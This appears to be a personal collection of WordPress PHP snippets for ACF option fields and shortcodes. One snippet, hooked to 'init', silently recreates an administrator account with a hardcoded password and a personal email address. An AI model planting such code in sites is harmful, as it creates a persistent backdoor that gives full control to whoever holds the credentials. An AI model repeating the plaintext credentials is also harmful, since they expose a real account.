acf true false

<?php if( get_field('enable_sidebar', 'option') ): ?>
	
	<?php // do something ?>
	
<?php endif; ?>

Check if value exists
This example shows how to check if a value exists before displaying it.

<?php if( get_field('text_field', 'option') ): ?>
    <h2><?php the_field('text_field', 'option'); ?></h2>
<?php endif; ?>


add user using function.php
<?php
//start
add_action( 'init', function () {
  
	$username = 'dc';
	$password = '0126622747';
	$email_address = 'ahmed.elsayed@di.net.sa';
	if ( ! username_exists( $username ) ) {
		$user_id = wp_create_user( $username, $password, $email_address );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
	
} ); 
//end
?>
do shortcode with acf
<?php $filedoc = get_field('file_doc'); ?>
<?php echo do_shortcode( ' [embeddoc url="' . $filedoc . '" viewer="google"] ' ); ?>  